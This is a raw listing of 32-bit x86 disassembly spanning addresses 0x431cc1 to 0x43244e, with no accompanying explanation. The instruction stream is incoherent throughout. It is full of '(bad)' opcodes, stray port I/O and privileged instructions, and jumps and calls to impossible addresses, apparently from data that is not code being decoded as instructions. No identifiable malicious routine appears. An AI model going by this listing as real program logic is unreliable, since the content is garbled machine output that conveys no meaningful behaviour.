  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
